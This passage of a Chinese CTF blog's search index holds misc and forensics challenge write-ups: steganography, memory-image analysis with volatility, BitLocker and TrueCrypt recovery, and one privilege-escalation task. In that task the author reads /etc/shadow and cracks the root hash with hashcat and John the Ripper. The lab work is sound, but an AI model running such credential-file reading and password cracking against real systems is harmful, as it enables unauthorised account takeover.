<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>春苗进阶考核实操</title>
      <link href="/2023/07/28/%E6%98%A5%E8%8B%97%E5%8F%96%E8%AF%81%E8%80%83%E6%A0%B8%E5%AE%9E%E6%93%8D/"/>
      <url>/2023/07/28/%E6%98%A5%E8%8B%97%E5%8F%96%E8%AF%81%E8%80%83%E6%A0%B8%E5%AE%9E%E6%93%8D/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a54c8c3cd2a7a1ecf91b8e231f4d224128f1ab8dd6d59c91224b4568548f3cea"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看喔</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>工控安全培训</title>
      <link href="/2023/07/24/%E5%B7%A5%E6%8E%A7-w3nx1z1/"/>
      <url>/2023/07/24/%E5%B7%A5%E6%8E%A7-w3nx1z1/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b1b1fac1b333972d501fd7a517cfad6a05bfb28d8fe25c58790b12ff17d9e2c1"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看喔</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> 工控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023巅峰极客MISC题解</title>
      <link href="/2023/07/21/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/"/>
      <url>/2023/07/21/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="2023巅峰极客MISC题解"><a href="#2023巅峰极客MISC题解" class="headerlink" title="2023巅峰极客MISC题解"></a>2023巅峰极客MISC题解</h1><p>很遗憾  这次因为某些原因 没能跟随战队一起打全程 虽然但是 也从比赛和战队师傅中学到了很多新东西！！！</p><h2 id="foundme-avif文件-foremost分离"><a href="#foundme-avif文件-foremost分离" class="headerlink" title="foundme(avif文件 foremost分离)"></a>foundme(avif文件 foremost分离)</h2><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230721204403800.png" alt="image-20230721204403800"></p><p>附件是一个dump文件 以为是普通的内存取证 然而试过了vol2和vol3都没取出东西来 </p><p>在尝试使用windbg <del>太晦涩了不会用</del> 队里做出来的师傅提醒没那么复杂</p><p>于是直接使用010查看 找到了一个hint</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230721205503651.png" alt="image-20230721205503651"></p><p>hint:提示寻找Netflix的图片格式 </p><p>搜索发现 Netflix的图片格式是avif文件 直接在附件里面寻avif文件</p><p>kali中使用foremost 分出很多文件 会发现foremost会将avif文件识别为mp4文件(010打开可以看出来) 将mp4的后缀名修改为avif 便可以打开 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230721222601212.png" alt="image-20230721222601212"></p><p><strong>flag{Y0ung_Ju57_f0rward}</strong></p><h2 id="一起学生物-盲水印-二进制转换"><a href="#一起学生物-盲水印-二进制转换" class="headerlink" title="一起学生物(盲水印 二进制转换)"></a>一起学生物(盲水印 二进制转换)</h2><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230721215225168.png" alt="image-20230721215225168"></p><p>附件给了两张图片 一眼盲水印</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230721215327368.png" alt="image-20230721215327368"></p><p>将结果再放入ps中 很清楚的可以看到<code>甲硫氨酸 </code> 算是一个hint</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230721215713653.png" alt="image-20230721215713653"></p><p>010打开其中无水印的原图 在文件尾找到一串字符串</p><pre><code>MFFMNMMFGHMMQWEMMTMMPMDFMMYMMRMKKKMMLMMGMPMPMMMMSMMVMMGMGMMMQMQMQMMMQMMMMEMEMEMEMMMMWMMMTMMMMPMMMDMNMNMMMMTMMMNMNMMNMNMMGMMGMGMGMGMMMMHMKMLMAMMMMAMAMAMSMSMSMMSMMYMYMMYMMYMMHMMVMVMMMMVMMRMMMRMAMAMMAMMAMMQMMMQMEMYMYMMM</code></pre><p>搜集相关资料</p><pre><code>甲硫氨酸（Methionine）是一种氨基酸，在蛋白质中通常作为起始氨基酸。具体来说，甲硫氨酸常作为新合成的蛋白质链的第一个氨基酸，即起始氨基酸，通过与核酸的起始密码子（通常是AUG）结合开始蛋白质的合成。在蛋白质合成过程中，mRNA（信使RNA）将遗传信息传递到核糖体，然后核糖体通过三个碱基（密码子）对应一个氨基酸，将氨基酸连接成蛋白质链。甲硫氨酸是这个过程的第一个氨基酸，它位于新合成蛋白质链的起始端。每个氨基酸都由三个碱基（核苷酸）编码，称为密码子。根据上述字符串，我们可以将它分成每三个字母一组，并且从背景知识来看，字符串中可能含有甲硫氨酸（M）作为起始氨基酸。因此，我们可以猜测这段字符串可能是由氨基酸的缩写来表示蛋白质序列的编码。</code></pre><pre><code class="python">input_str=&#39;MFFMNMMFGHMMQWEMMTMMPMDFMMYMMRMKKKMMLMMGMPMPMMMMSMMVMMGMGMMMQMQMQMMMQMMMMEMEMEMEMMMMWMMMTMMMMPMMMDMNMNMMMMTMMMNMNMMNMNMMGMMGMGMGMGMMMMHMKMLMAMMMMAMAMAMSMSMSMMSMMYMYMMYMMYMMHMMVMVMMMMVMMRMMMRMAMAMMAMMAMMQMMMQMEMYMYMMM&#39;po=&#39;&#39;for i,char in enumerate(input_str):    if char==&#39;M&#39;:        po_even=i%2        po+=str(po_even)print(po)# 0110011001101100011000010110011101111011010000010110110100100001011011100011000001011111010000000110001100110001011001000011001101111101</code></pre><p>二进制转字符串出<strong>flag{Am!n0_@c1d3}</strong></p><h2 id="song-deepsound-Ook编码"><a href="#song-deepsound-Ook编码" class="headerlink" title="song(deepsound Ook编码)"></a>song(deepsound Ook编码)</h2><p> foremost分离一下 分出一个zip文件 解压后 在docProps文件中 找到一个thumbnail.jpg图片 thumbnail有缩率图的意思 在图片左上角可以看到一个模糊的zip图标 猜测包含zip文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230723113827771.png" alt="image-20230723113827771"></p><p>binwalk一下 提出zip文件 里面有一个加密的flag.txt和password_hint.txt 里面内容是</p><pre><code>9iZ!r@n(9KAQV])&lt;,6_K:,$L-&lt;`N0U&gt;&#39;`J\@;A:f@X:pc;__&lt;N;f-&gt;);/8c[&lt;(K&gt;S=u&amp;Q&lt;&lt;C\oJA2-DK9l+cpAQMnd;/LD5=&amp;s-8@T?rP;cdd&#39;:,$@!;_g1U&lt;ARX#;)&lt;$*;/J0E@P^bo;f-JGAQ3=t:/tFO@r$$s9gs:q@kgl&#39;&lt;`Lh:</code></pre><p>经过base85 base64 base62 base58 base32解码后得到hint</p><pre><code>密码是常见弱口令&#123;******&#125;</code></pre><p>又在zip&#x2F;ppt&#x2F;media里面找到两张看上去相同的图片 放进010里进行对比 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230723115132229.png" alt="image-20230723115132229"></p><p>在image4.png尾部发现冗余部分 提取出来</p><p>观察文件头为4D414320(MAC) 是APE文件的文件头</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230723154323602.png" alt="image-20230723154323602"></p><p>有密码有音频文件 可以使用deepsound提取隐藏信息 提示密码是常见的六位弱口令 猜测是<code>123456</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230723174706215.png" alt="image-20230723174706215"></p><p>打开是一段Ook编码 在线网站一把梭 得到压缩包解压密码：<code>QazWsx147!@#</code> 解压得到flag</p><p><strong>flag{lW9tUyrh8RzzvysrswAwY7MHR4mmbLSt}</strong></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022蓝帽杯初赛取证复现</title>
      <link href="/2023/07/04/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/07/04/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="2022蓝帽杯初赛取证复现"><a href="#2022蓝帽杯初赛取证复现" class="headerlink" title="2022蓝帽杯初赛取证复现"></a>2022蓝帽杯初赛取证复现</h1><h2 id="计算机取证"><a href="#计算机取证" class="headerlink" title="计算机取证"></a>计算机取证</h2><p>下载附件  拿到一个dmp内存镜像和一个E01计算机镜像</p><h3 id="取证一：在内存镜像中的taqi7开机密码为"><a href="#取证一：在内存镜像中的taqi7开机密码为" class="headerlink" title="取证一：在内存镜像中的taqi7开机密码为"></a>取证一：在内存镜像中的taqi7开机密码为</h3><pre><code> .\volatility.exe -f .\1.dmp imageinfo .\volatility.exe -f .\1.dmp --profile=Win7SP1x64 hashdump</code></pre><p>拿到taqi7开机密码的哈希值为：<code>7f21caca5685f10d9e849cc84c340528</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230709203653105.png" alt="image-20230709203653105"></p><p><strong>NSSCTF{anxinqi}</strong></p><h3 id="取证二：制作该内存镜像的进程PID号为"><a href="#取证二：制作该内存镜像的进程PID号为" class="headerlink" title="取证二：制作该内存镜像的进程PID号为"></a>取证二：制作该内存镜像的进程PID号为</h3><p>通过搜索 我们可以知道 可以制作内存镜像的进程有：</p><pre><code>dd命令 Win32ddFmemLIMEMagnet RAM Capture</code></pre><pre><code>.\volatility.exe -f .\1.dmp --profile=Win7SP1x64 pslist</code></pre><p>在该内存所有的进程信息中 可以找到<strong>Magnet RAM Capture</strong>的进程PID为<font color='red'>2192</font></p><p><strong>NSSCTF{2192}</strong></p><h3 id="取证三：计算机镜像中bitlokcer分区某office文件中存在的flag值为？"><a href="#取证三：计算机镜像中bitlokcer分区某office文件中存在的flag值为？" class="headerlink" title="取证三：计算机镜像中bitlokcer分区某office文件中存在的flag值为？"></a>取证三：计算机镜像中bitlokcer分区某office文件中存在的flag值为？</h3><p>首先 有内存镜像 有e01镜像 直接爆破bitlocker密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230709211136803.png" alt="image-20230709211136803"></p><p>得到bitlocker解密密钥：<strong>368346-029557-428142-651420-492261-552431-515438-338239</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230709211201839.png" alt="image-20230709211201839"></p><p>在取证大师中解密bitlocker加密分区 提取出两个加密文件 一个密码本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230709211335882.png" alt="image-20230709211335882"></p><p>使用密码本 进行字典爆破 </p><p>得密码分别为<strong>287fuweiuhfiute</strong> 和 <strong>688561</strong></p><p>从渗透看取证.pptx中有flag</p><p><strong>NSSCTF{b27867b66866866686866883bb43536}</strong></p><h3 id="取证四：TrueCrypt加密中存在的flag值为？"><a href="#取证四：TrueCrypt加密中存在的flag值为？" class="headerlink" title="取证四：TrueCrypt加密中存在的flag值为？"></a>取证四：TrueCrypt加密中存在的flag值为？</h3><p>先用取证大师自带的内存镜像解析工具提取出TC加密容器密钥文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230709213059097.png" alt="image-20230709213059097"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230709213153459.png" alt="image-20230709213153459"></p><p>导出密钥文件 在挂载TC加密文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230709213400070.png" alt="image-20230709213400070"></p><p>发现一个加密zip文件 爆破出密码为：<strong>991314</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230709213645644.png" alt="image-20230709213645644"></p><p>解压得flag</p><p><strong>NSSCTF{1349934913913991394cacacacacacc}</strong></p><h2 id="手机取证"><a href="#手机取证" class="headerlink" title="手机取证"></a>手机取证</h2><h3 id="取证一：627604C2-C586-48C1-AA16-FF33C3022159-PNG图片的分辨率是？"><a href="#取证一：627604C2-C586-48C1-AA16-FF33C3022159-PNG图片的分辨率是？" class="headerlink" title="取证一：627604C2-C586-48C1-AA16-FF33C3022159.PNG图片的分辨率是？"></a>取证一：627604C2-C586-48C1-AA16-FF33C3022159.PNG图片的分辨率是？</h3><p>在附件中有一个<code>苹果测试 查看.exe</code> 在里面直接搜索目标图片 并导出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/627604C2-C586-48C1-AA16-FF33C3022159.PNG" alt="627604C2-C586-48C1-AA16-FF33C3022159"></p><p>查看图片信息 得到分辨率为<strong>360x360</strong></p><p><strong>NSSCTF{360x360}</strong></p><h3 id="取证二：姜总的快递单号是多少？"><a href="#取证二：姜总的快递单号是多少？" class="headerlink" title="取证二：姜总的快递单号是多少？"></a>取证二：姜总的快递单号是多少？</h3><p>在给的取证测试里面直接搜索<code>姜总</code> 在聊天记录里面找到订单号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230711203924882.png" alt="image-20230711203924882"></p><p><strong>NSSCTF{SF1142358694796}</strong></p><h2 id="网站取证"><a href="#网站取证" class="headerlink" title="网站取证"></a>网站取证</h2><h3 id="取证一：请从网站源码中找出木马文件，并提交木马连接的密码。"><a href="#取证一：请从网站源码中找出木马文件，并提交木马连接的密码。" class="headerlink" title="取证一：请从网站源码中找出木马文件，并提交木马连接的密码。"></a>取证一：请从网站源码中找出木马文件，并提交木马连接的密码。</h3><p>拿到网站源码和部分数据库文件 在解压网站源码时火绒告警</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230711151302327.png" alt="image-20230711151302327"></p><p>在虚拟机中打开 找到木马文件 连接密码就是：<code>lanmaobei666</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230711151439474.png" alt="image-20230711151439474"></p><p><strong>NSSCTF{lanmaobei666}</strong></p><h3 id="取证二：请提交数据库连接的明文密码"><a href="#取证二：请提交数据库连接的明文密码" class="headerlink" title="取证二：请提交数据库连接的明文密码"></a>取证二：请提交数据库连接的明文密码</h3><p>在WWW&#x2F;application&#x2F;database处 找到数据库密码的明文为<code>my_encrypt()</code> 意思是需要经过这个函数计算之后得到明文</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230711165231681.png" alt="image-20230711165231681"></p><p>在application文件夹下 正好有一个encrypt文件夹 里面正是my_encrypt()函数的解密过程</p><pre><code class="php">&lt;?phpfunction my_encrypt()&#123;    $str = &#39;P3LMJ4uCbkFJ/RarywrCvA==&#39;;    $str = str_replace(array(&quot;/r/n&quot;, &quot;/r&quot;, &quot;/n&quot;), &quot;&quot;, $str);    $key = &#39;PanGuShi&#39;;    $iv = substr(sha1($key),0,16);    $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&quot;&quot;,MCRYPT_MODE_CBC,&quot;&quot;);    mcrypt_generic_init($td, &quot;PanGuShi&quot;, $iv);    $decode = base64_decode($str);    $dencrypted = mdecrypt_generic($td, $decode);    mcrypt_generic_deinit($td);    mcrypt_module_close($td);    $dencrypted = trim($dencrypted);    return $dencrypted;&#125;</code></pre><p>解密过程是：</p><p>1.总体解密方法为AES解密的CBC模式</p><p>2.解密密钥为<code>PanGuShi</code></p><p>3.偏移值是<code>PanGuShi</code>经过SHA1加密后的前16位</p><p>由此可以进行在线解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230711171506060.png" alt="image-20230711171506060"></p><p>数据库连接的明文密码为:<code>KBLT123</code></p><p><strong>NSSCTF{KBLT123}</strong></p><h3 id="取证三：请提交数据库金额加密混淆使用的盐值"><a href="#取证三：请提交数据库金额加密混淆使用的盐值" class="headerlink" title="取证三：请提交数据库金额加密混淆使用的盐值"></a>取证三：请提交数据库金额加密混淆使用的盐值</h3><p>一点点翻源码</p><p>在<code>WWW\application\admin\model\Channelorderlist</code>中找到盐值</p><pre><code class="php">    function decrypt($data, $key = &#39;jyzg123456&#39;)    &#123;        header(&#39;Content-type:text/html;charset=utf-8&#39;);        $key = md5($key);        $x = 0;        $data = base64_decode($data);        $len = mb_strlen($data);        $l = mb_strlen($key);        $char = &#39;&#39;;        $str = &#39;&#39;;        for ($i = 0; $i &lt; $len; $i++) &#123;            if ($x == $l) &#123;                $x = 0;            &#125;            $char .= mb_substr($key, $x, 1);            $x++;        &#125;        for ($i = 0; $i &lt; $len; $i++) &#123;            if (ord(mb_substr($data, $i, 1)) &lt; ord(mb_substr($char, $i, 1))) &#123;                $str .= chr((ord(mb_substr($data, $i, 1)) + 256) - ord(mb_substr($char, $i, 1)));            &#125; else &#123;                $str .= chr(ord(mb_substr($data, $i, 1)) - ord(mb_substr($char, $i, 1)));            &#125;        &#125;        return $str;    &#125;</code></pre><p><strong>NSSCTF{jyzg123456}</strong></p><h3 id="取证四：请计算张宝在北京时间2022-04-02-00-00-00-2022-04-18-23-59-59累计转账给王子豪多少RMB？"><a href="#取证四：请计算张宝在北京时间2022-04-02-00-00-00-2022-04-18-23-59-59累计转账给王子豪多少RMB？" class="headerlink" title="取证四：请计算张宝在北京时间2022-04-02 00:00:00-2022-04-18 23:59:59累计转账给王子豪多少RMB？"></a>取证四：请计算张宝在北京时间2022-04-02 00:00:00-2022-04-18 23:59:59累计转账给王子豪多少RMB？</h3><p>在数据库中提取2到18号的交易记录 2到18号每天GG币和RMB的汇率 </p><p>翻找数据库 发现 张宝的用户id为3 王子豪的用户id为5 </p><p>在交易记录的倒数第三位和倒数第二位分别为收款人和付款人 所以匹配含有数据(5,3)的交易记录 再将每天GG币的数量 脱盐解密 乘上汇率 汇总就是转账的RMB</p><pre><code class="python">import base64import hashlibdef decrypt(data):    key  = hashlib.md5()    key.update(b&#39;jyzg123456&#39;)    key = key.hexdigest()    x = 0    data = base64.b64decode(data)    Len = len(data)    l = len(key)    char = &quot;&quot;    str = &quot;&quot;    for i in range(Len):        if(x==l):            x = 0        char+=key[x:x+1]        x+=1    i =0    for i in range(Len):        if(ord(data[i:i+1])&lt;ord(char[i:i+1])):            str+=chr(ord(data[i:i+1]+256)-ord(char[i:i+1]))        else:            str+=chr(ord(data[i:i+1])-ord(char[i:i+1]))    return strdata = &quot;&quot;huilv = [0,0,0.04,0.06,0.05,0.07,0.10,0.15,0.17,0.23,0.22,0.25,0.29,0.20,0.28,0.33,0.35,0.35,0.37]money = 0Money = 0with open(&quot;./flag.txt&quot;,&quot;r&quot;,encoding=&#39;utf-8&#39;) as file:    data = file.readlines()for line in data:    if(int(line.split(&#39;,&#39;)[5])==5 and int(line.split(&#39;,&#39;)[6])==3):        Data = int(line.split(&#39;,&#39;)[4][10:12])        money = line.split(&#39;,&#39;)[7][2:10]        tmpmoney = huilv[Data]*int(decrypt(money))        Money += tmpmoney        print(Data,huilv[Data],decrypt(money),tmpmoney,line.split(&#39;,&#39;)[5],line.split(&#39;,&#39;)[6])print(&quot;最后金额&quot;,Money)</code></pre><p><strong>NSSCTF{15758353.76}</strong></p><h2 id="程序取证"><a href="#程序取证" class="headerlink" title="程序取证"></a>程序取证</h2><h3 id="取证一：本程序包名是？"><a href="#取证一：本程序包名是？" class="headerlink" title="取证一：本程序包名是？"></a>取证一：本程序包名是？</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230712215022357.png" alt="image-20230712215022357"></p><p><strong>NSSCTF{exec.azj.kny.d.c}</strong></p><h3 id="取证二：本程序的入口是？"><a href="#取证二：本程序的入口是？" class="headerlink" title="取证二：本程序的入口是？"></a>取证二：本程序的入口是？</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230712220703890.png" alt="image-20230712220703890"></p><p>Android程序的入口就是<code>Main Activity函数</code></p><p><code>package</code>的值就是程序入口 记得后面加上<code>MainActivity</code></p><p><strong>NSSCTF{minmtta.hemjcbm.ahibyws.MainActivity}</strong></p><h3 id="取证三：本程序的服务器地址的密文是？"><a href="#取证三：本程序的服务器地址的密文是？" class="headerlink" title="取证三：本程序的服务器地址的密文是？"></a>取证三：本程序的服务器地址的密文是？</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230716125210431.png" alt="image-20230716125210431"></p><p>直接找到服务器地址的密文：</p><p><strong>NSSCTF{aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6}</strong></p><h3 id="取证四：本程序实现安全检测的类的名称是："><a href="#取证四：本程序实现安全检测的类的名称是：" class="headerlink" title="取证四：本程序实现安全检测的类的名称是："></a>取证四：本程序实现安全检测的类的名称是：</h3><p>全局搜索 <strong>“安全”</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230716124708919.png" alt="image-20230716124708919"></p><p>这里引用了一个d.a.a.c.a.a()函数</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230716151334870.png" alt="image-20230716151334870"></p><p>找到该函数 发现定义的类就是<code>a</code></p><p><strong>NSSCTF{a}</strong></p>]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound 12 Misc 专场</title>
      <link href="/2023/06/04/NSSRound%2012%20Misc%20%E4%B8%93%E5%9C%BA/"/>
      <url>/2023/06/04/NSSRound%2012%20Misc%20%E4%B8%93%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSRound-12-Misc-专场"><a href="#NSSRound-12-Misc-专场" class="headerlink" title="NSSRound 12 Misc 专场"></a>NSSRound 12 Misc 专场</h1><h2 id="Secrets-in-Shadow-linux提权"><a href="#Secrets-in-Shadow-linux提权" class="headerlink" title="Secrets in Shadow(linux提权 )"></a>Secrets in Shadow(linux提权 )</h2><p>首先ssh远程连接上主机  直接看目录 发现flag文件  但是没有权限访问 需要进行提权</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230528085116572.png" alt="image-20230528085116572"></p><p><strong>我们现在需要寻找的是root权限的密码 登陆root 获得读取flag的权限</strong></p><p>通过查看&#x2F;etc&#x2F;shadow文件  可以得到root密码的哈希值</p><pre><code>$6$Vh57Xwpz34U8wthL$Xd0QAbWlZgB4nOhgDPCR/Q50rhAUsVVkIs3MUiglBlMychQjULqAADyTSzTXNuuF0TO.2TzUi574DHY6e8Fma1</code></pre><pre><code>hashcat -m 1800 -a 0 -o value.txt hash rockyou.txt # value.txt是存放爆破结果的文件 hash存放想要爆破的哈希值 rockyou.txt是字典文件</code></pre><p><strong>再补充一下john爆破的命令：</strong></p><pre><code>john --wordlist=字典地址 --user=要爆破密码的用户名 哈希文件 保存结果的文件</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603173158932.png" alt="image-20230603173158932"></p><p><strong>得到密码为：bullshit</strong></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603173457813.png" alt="image-20230603173457813"></p><p>**:horse:NSSCTF{6011c959-50a4-4761-b08a-76c87a7c9e37}**s</p><h2 id="ordinary-forensics-内存取证-挂载ext系统磁盘"><a href="#ordinary-forensics-内存取证-挂载ext系统磁盘" class="headerlink" title="ordinary forensics(内存取证 挂载ext系统磁盘)"></a>ordinary forensics(内存取证 挂载ext系统磁盘)</h2><p>打开之后有一个内存镜像一个unknown文件</p><p>首先进行内存取证 发现可以使用volatility2进行取证</p><pre><code>volatility -f  forensics.raw imageinfo  #获得内存镜像的操作系统版本</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230602094324154.png" alt="image-20230602094324154"></p><pre><code>volatility -f  forensics.raw --profile==Win7SP1x64 cmdscan #提取镜像中cmd命令的使用情况</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230602094452525.png" alt="image-20230602094452525"></p><p>找到一个password：U_find_1t</p><p>那面下面的目标就是要找压缩包了  但其实应该是png txt jpg 等可能的证据文件都提取一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603084225877.png" alt="image-20230603084225877"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603084358692.png" alt="image-20230603084358692"></p><p>hint.txt里面提到vera</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603084433823.png" alt="image-20230603084433823"></p><p>useful.zip使用上面找到的password解压 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603084519072.png" alt="image-20230603084519072"></p><p>猜测是使用useful.txt挂载vc容器  得到一个secret</p><p>首先查看文件类型：是ext3系统磁盘文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603162203998.png" alt="image-20230603162203998"></p><p>进行挂载 查看磁盘内文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603162308535.png" alt="image-20230603162308535"></p><p>压缩包内提示 密码为username_hostname 显然问的是内存镜像中的信息 再回去对信息进行提取</p><pre><code>volatility -f forensics.raw --profile=Win7SP1x64 printkey -K &quot;SAM\Domains\Account\Users\Names&quot; # 查看系统用户名volatility -f forensics.raw --profile=Win7SP1x64 printkey -K &quot;ControlSet001\Control\ComputerName\ComputerName&quot; # 查看计算机名</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603163308057.png" alt="image-20230603163308057"></p><p>得到解压密码：Mario_Princess-Peach</p><p>:horse:<strong>NSSCTF{f0rens1cs_1s_Interesting}</strong> </p><h2 id="Bulbasaur-盲水印-阴阳怪气编码"><a href="#Bulbasaur-盲水印-阴阳怪气编码" class="headerlink" title="Bulbasaur(盲水印 阴阳怪气编码)"></a>Bulbasaur(盲水印 阴阳怪气编码)</h2><p>有题目描述可以猜测是盲水印 使用工具一把梭 <strong>得到：blind watermark</strong>   空格多试几次就看出来了 这就是压缩包的密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603184810342.png" alt="image-20230603184810342"></p><p>解压压缩包 得到一段文字 复制一段上网搜索 得知是阴阳怪气编码 <a href="https://mmdjiji.gitee.io/yygq.js/">阴阳怪气编码</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603185021897.png" alt="image-20230603185021897"></p><p><strong>:hot_pepper:NSSCTF{W@t3rMaRk_1s_s0000000_35s9}</strong></p><h2 id="坏东西-嵌套压缩包"><a href="#坏东西-嵌套压缩包" class="headerlink" title="坏东西(嵌套压缩包)"></a>坏东西(嵌套压缩包)</h2><p>拿到一个压缩包99020.zip 验证后发现不是伪加密 爆破得到密码就是99020</p><p>里面有一个压缩包 压缩包里面还有压缩包 猜测压缩包名前的数字就是每个压缩包的解压密码 写脚本 解压</p><pre><code class="python">import zipfilename = &#39;99020&#39;while True:    fz = zipfile.ZipFile(name + &#39;.zip&#39;, &#39;r&#39;)    fz.extractall(pwd=bytes(name, &#39;utf-8&#39;))    name = fz.filelist[0].filename.rstrip(&#39;.zip&#39;)    print(fz.filelist[0].filename)    fz.close()</code></pre><p>得到一个损坏的flag.pdf  放在010editor里面发现flag被拆分藏在 &#x2F;Filter&#x2F;FlateDecode里面 一点点手撸吧。。。</p><p><strong>NSSCTF{25da50b7993c0db55867a5a51f32f35c}</strong></p><h2 id="奇怪的tex文件-提取包含文件"><a href="#奇怪的tex文件-提取包含文件" class="headerlink" title="奇怪的tex文件(提取包含文件)"></a>奇怪的tex文件(提取包含文件)</h2><p>首先 了解一下tex文件</p><pre><code>TeX 文件是使用自己的标记语言编写的采用 ASCII 编码的纯文本文件。 它们可能需要包含其他数据，例如图像或其他LaTeX文件。 此类文件通常需要特定的软件才能使用它们。(比如cm3d2/com3d2)</code></pre><p>注意：里面提到了可能需要包含其他文件 这是本题的关键 </p><p>放在010editor里面查看 从第65个十六进制字符开始到每个文件尾 都是一个png图片 将其提取出来 </p><pre><code class="python">import osdef extract_png_from_folder(folder_path):    file_paths = [os.path.join(folder_path, file) for file in os.listdir(folder_path) if                  os.path.isfile(os.path.join(folder_path, file))]    for file_path in file_paths:        with open(file_path, &#39;rb&#39;) as file:            file_data = file.read()        # 找到PNG图片的起始位置        png_start = file_data.find(b&#39;\x89\x50\x4E\x47\x0D\x0A\x1A\x0A&#39;)    